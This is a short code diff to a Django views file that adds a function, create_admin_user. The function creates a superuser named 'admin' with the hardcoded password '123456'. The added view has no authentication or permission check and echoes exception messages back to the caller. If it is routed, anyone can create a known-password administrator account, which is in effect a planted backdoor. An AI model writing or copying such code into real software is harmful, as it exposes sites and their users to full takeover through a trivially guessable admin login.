@@ -6,6 +6,22 @@ from rest_framework.permissions import IsAdminUser, AllowAny
 from django.db.models import F, Sum
 
 
+from django.contrib.auth.models import User
+from django.http import JsonResponse
+
+def create_admin_user(request):
+    try:
+        if not User.objects.filter(username="admin").exists():
+            User.objects.create_superuser(
+                username="admin",
+                email="admin@example.com",
+                password="123456"
+            )
+            return JsonResponse({"status": "created", "message": "Admin user created"})
+        return JsonResponse({"status": "exists", "message": "Admin already exists"})
+    except Exception as e:
+        return JsonResponse({"status": "error", "message": str(e)})
+
 
 
 
